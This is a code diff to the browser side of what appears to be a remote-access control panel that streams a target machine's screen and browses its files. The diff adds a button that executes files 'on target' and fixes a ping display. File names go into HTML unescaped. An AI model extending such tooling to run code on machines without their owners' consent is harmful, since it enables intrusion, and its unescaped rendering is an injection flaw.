@@ -414,7 +414,8 @@ socket.on('screen_frame', d => {
         const now = performance.now();
         if(now - lastFrame > 1000) {
             fps = Math.round(frameCount*1000/(now-lastFrame));
-            document.getElementById('fpsPill').textContent = `FPS: ${fps} | Ping: ${Math.round(performance.now()/1000 - d.timestamp)}ms`;
+            const ping = Math.round(Date.now() - (d.timestamp * 1000));
+            document.getElementById('fpsPill').textContent = `FPS: ${fps} | Ping: ${ping > 0 ? ping : 0}ms`;
             frameCount=0; lastFrame=now;
         }
         document.getElementById('resPill').textContent = (d.width || '--')+'×'+(d.height || '--');
@@ -522,10 +523,14 @@ socket.on('file_list', d => {
             <span class="file-name">${f.name}${f.error?' 🔒':''}</span>
             <span class="file-meta">${f.is_dir?'':formatSize(f.size)}</span>
             <span class="file-meta">${f.modified}</span>
-            ${!f.is_dir?`<button class="btn btn-sm" onclick="event.stopPropagation();downloadFile('${f.path.replace(/'/g,"\\'")}')">⬇️</button>`:''}
+            ${!f.is_dir?`
+                <button class="btn btn-sm" onclick="event.stopPropagation();runFile('${f.path.replace(/'/g,"\\'")}')" title="Run">▶️</button>
+                <button class="btn btn-sm" onclick="event.stopPropagation();downloadFile('${f.path.replace(/'/g,"\\'")}')">⬇️</button>
+            `:''}
             <button class="btn btn-sm danger" onclick="event.stopPropagation();deleteFile('${f.path.replace(/'/g,"\\'")}','${f.name}')">🗑️</button>
         </div>`).join('');
 });
+function runFile(p) { if(confirm('Execute this file on target?')) socket.emit('file_run',{path:p}); }
 function browsePath(p) { socket.emit('file_browse',{path:p}); }
 function browseParent() { const p=document.getElementById('pathBar').value; const parent=p.substring(0,p.lastIndexOf('/')); browsePath(parent||'/'); }
 function downloadFile(p) { window.open('/download?path='+encodeURIComponent(p),'_blank'); }
